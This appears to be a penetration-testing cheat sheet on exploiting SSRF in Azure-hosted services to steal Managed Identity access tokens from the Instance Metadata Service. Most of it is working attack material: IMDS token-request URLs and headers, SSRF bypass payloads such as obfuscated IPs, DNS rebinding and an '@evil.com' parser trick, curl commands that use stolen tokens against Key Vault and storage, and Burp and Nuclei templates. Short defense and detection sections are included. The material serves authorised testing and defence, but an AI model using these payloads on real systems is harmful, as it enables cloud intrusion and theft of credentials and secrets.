# Azure SSRF → Managed Identity Credential Theft

**💡 Context**

- In Azure, **Instance Metadata Service (IMDS)** provides tokens for
  **Managed Identities** (user-assigned or system-assigned).

- IMDS is accessible via:

- http://169.254.169.254/metadata/identity/oauth2/token

- By abusing **SSRF** or RCE in an Azure-hosted app (e.g., App Service,
  Function, VM), an attacker can request access tokens tied to the
  instance's managed identity.

## Azure SSRF Exploitation Flow

1.  **Locate a vulnerable service** (e.g., web app, function) that
    allows **SSRF** or RCE.

2.  **Craft a metadata token request**:

3.  GET
    /metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com

4.  Host: 169.254.169.254

5.  Metadata: true

6.  **Send request via SSRF or local RCE**.

7.  **Extract access token** from response:

8.  {

9.  "access_token": "eyJ0eXAiOiJKV1Qi...",

10. "expires_in": "3599",

11. "token_type": "Bearer"

12. }

13. **Use token with Azure CLI or REST API**:

14. az login --identity

15. curl -H "Authorization: Bearer \<access_token\>"
    https://management.azure.com/subscriptions?api-version=2020-01-01

16. **Enumerate privileges**, pivot, or exfiltrate secrets:

    - Access Key Vault: https://vault.azure.net

    - Query Microsoft Graph: https://graph.microsoft.com

    - Dump storage, secrets, or deploy further persistence

## Defense (Blue Team Note)

- **Restrict public exposure** of services handling user-supplied URLs
  or request proxies.

- **Enable App Service VNet Integration** and use **NSGs** to prevent
  access to 169.254.169.254.

- Use **Conditional Access**, **Defender for Cloud**, and **Managed
  Identity least privilege**.

**Detection Tips**

- Monitor for unexpected access to 169.254.169.254 from applications.

- Look for anomalous token use via Azure Activity Logs or Graph API
  calls from app identities.

## Checklist: Azure Services Vulnerable to SSRF-Based Metadata Theft

Here’s a **checklist of Azure services** and components that are either
**vulnerable to SSRF-based metadata theft** or have been **used in
real-world attack chains** involving SSRF to steal Managed Identity
tokens from the Instance Metadata Service (IMDS):

**1. Azure Virtual Machines (VMs)**

- **SSRF or RCE in VM-hosted app** can access IMDS at
  http://169.254.169.254/metadata/identity/oauth2/token

- **No network restrictions** by default

**2. Azure App Services (Web Apps)**

- Public-facing apps accepting URL input (e.g., image fetchers, webhook
  relays)

- Vulnerable SSRF allows access to IMDS

- Token fetch endpoint:

- <http://169.254.169.254/metadata/identity/oauth2/token>

**3. Azure Functions**

- Especially when used as backend APIs

- SSRF or insecure deserialization can lead to token exposure

- Often assigned **System-Assigned Managed Identity** for access to
  Storage, Key Vault, etc.

**4. Azure Container Instances (ACI)**

- Access to IMDS over local IP is often enabled

- Containers may expose web servers or APIs that are SSRF-prone

**5. Azure Kubernetes Service (AKS)**

- **Pods using Managed Identity (via AAD Pod Identity)** can be SSRF
  targets

- Exploiting apps within pods can yield tokens

**6. Azure App Gateway with WAF**

- Sometimes misconfigured to allow SSRF chaining through backend routing

- Can be paired with vulnerable web apps to proxy token requests

**7. Azure Logic Apps**

- Improper use of HTTP connectors or webhook-based logic flows

- May expose internal services that can be abused via SSRF

## Known SSRF Exploitation Patterns in Azure

| **Pattern** | **Impact** | **Example** |
|----|----|----|
| SSRF → IMDS | Steal Managed Identity token | Access Vault, Graph API, Storage |
| SSRF via Open Redirect | Redirect attacker-controlled URL to IMDS | Proxy to 169.254.169.254 |
| SSRF via Deserialization | App unpacks attacker-controlled object with URL fetch | Full RCE or internal HTTP access |
| Proxy misconfig (e.g., nginx, appgateway) | Redirect to IMDS via X-Forwarded-Host trick | Confused proxy SSRF |

**Suggested Hardening Controls**

- **Block access to IMDS from app code** unless needed

- Use **User-Assigned Managed Identities** with minimal scopes

- Monitor apps with public input that can fetch remote URLs

- Apply **NSGs or Azure Firewall** rules blocking 169.254.169.254 from
  untrusted workloads

- Implement **Content Security Policy (CSP)** in web apps where
  applicable

## Azure SSRF Testing Checklist

### 1. Check for SSRF in Web Inputs

- Image uploaders / fetchers

- Webhook URLs

- PDF generators

- URL preview/metadata fetch tools

- API endpoints that accept user-controlled URLs

###  2. Attempt Metadata Service Access

Try accessing the Azure Instance Metadata Service (IMDS):

http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

**Required Header:**

Metadata: true

###  3. Verify Token Exposure

A successful SSRF may return:

{

"access_token": "eyJ0eXAiOiJKV1QiLCJh...",

"expires_in": "3599",

"token_type": "Bearer",

"resource": "https://management.azure.com/"

}

Use this token to access Azure services:

curl -H "Authorization: Bearer \<TOKEN\>"
https://management.azure.com/subscriptions?api-version=2020-01-01

###  4. Test Common SSRF Bypass Techniques

| **Technique**     | **Example**                                           |
|-------------------|-------------------------------------------------------|
| DNS rebinding     | http://your.evil.server → resolves to 169.254.169.254 |
| Obfuscated IPs    | http://0xA9FEA9FE or http://2130706433                |
| Localhost aliases | http://localhost, http://127.0.0.1, http://\[::1\]    |
| Headers overwrite | Add Host: 169.254.169.254                             |
| Redirect chaining | Use an open redirect to forward to IMDS               |
| Path confusion    | http://169.254.169.254@evil.com (trick parsers)       |

###  5. Privilege Escalation Paths via Token Abuse

- Access Azure Key Vault:

- curl -H "Authorization: Bearer \<token\>" \\

- https://\<vault-name\>.vault.azure.net/secrets?api-version=7.0

- Access Storage Blobs:

- https://\<storage\>.blob.core.windows.net/\<container\>?restype=container&comp=list

- Enumerate Resource Groups / VMs / App Services

###  6. Validate Environment Variables in SSRF Targets

Look for exposed container metadata:

http://169.254.170.2/v2/credentials

From inside Azure Container Instances or App Services.

## 🧪 SSRF Payload Examples

\# Basic

http://169.254.169.254/metadata/identity/oauth2/token

\# With resource and header

curl -H "Metadata:true" \\

"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/"

\# Open redirect abuse

https://vulnerable.com/redirect?url=http://169.254.169.254/metadata/identity/oauth2/token

\# DNS rebinding

http://yourattackercontrolleddomain.com → points to metadata IP

\# Obfuscated format

http://0xA9FEA9FE/metadata/identity/oauth2/token

## Detection & Prevention

- Restrict outbound traffic to 169.254.169.254 via NSG or Azure Firewall

- Validate URLs and restrict domains in user inputs

- Use WAF rules to detect internal IP access patterns

- Audit Managed Identity token usage via Azure AD logs

## Burp Suite Repeater (Azure SSRF to Metadata Service)

**📋 Request Template**

GET
/?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
HTTP/1.1

Host: vulnerable-azure-app.com

Metadata: true

User-Agent: Mozilla/5.0

Modify the url parameter and Host as per your target.

**Success Indicator:**

Look for a 200 OK and response containing:

"access_token": "eyJ0eXAiOiJKV1QiLCJh..."

\\

## Nuclei Template (Azure SSRF IMDS Discovery)

id: azure-imds-ssrf

info:

name: Azure SSRF to IMDS Token Leak

author: pentester-labs

severity: high

description: Detects SSRF access to Azure Instance Metadata Service for
token extraction

tags: azure,ssrf,imds

requests:

\- method: GET

path:

\-
"{{BaseURL}}/?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

headers:

Metadata: "true"

matchers:

\- type: regex

regex:

\- '"access_token"\s\*:\s\*".+?"'

\- type: status

status:

\- 200

📌 Ensure the target has a vulnerable endpoint that reflects or uses the
url parameter.
